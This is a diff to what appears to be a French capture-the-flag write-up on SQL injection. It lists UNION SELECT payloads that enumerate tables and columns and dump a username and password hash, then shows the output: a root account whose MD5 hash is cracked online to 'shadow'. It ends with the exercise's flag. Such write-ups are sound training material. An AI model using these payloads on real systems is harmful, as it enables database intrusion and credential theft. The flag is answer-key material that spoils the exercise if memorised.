@@ -15,3 +15,14 @@ http://www.sqlinjection.net/table-names/
 " 1 AND 1=2 UNION SELECT table_schema, table_name FROM information_schema.tables "
 " 5 AND 1=2 UNION SELECT table_name, column_name FROM information_schema.columns "
 " 1 AND 1=2 UNION SELECT username, password FROM Member_Brute_Force.db_default "
+
+on retrouve donc :
+
+ID: 1 AND 2=3 UNION SELECT username, password FROM Member_Brute_Force.db_default 
+First name: root
+Surname : 3bf1114a986ba87ed28fc1b5884fc2f8
+
+nous avons donc le mot de passe root encrypté, on le décode avec un md5 decrypter en ligne ce qui nous donne shadow
+
+FLAG = B3A6E43DDF8B4BBB4125E5E7D23040433827759D4DE1C04EA63907479A80A6B2
+
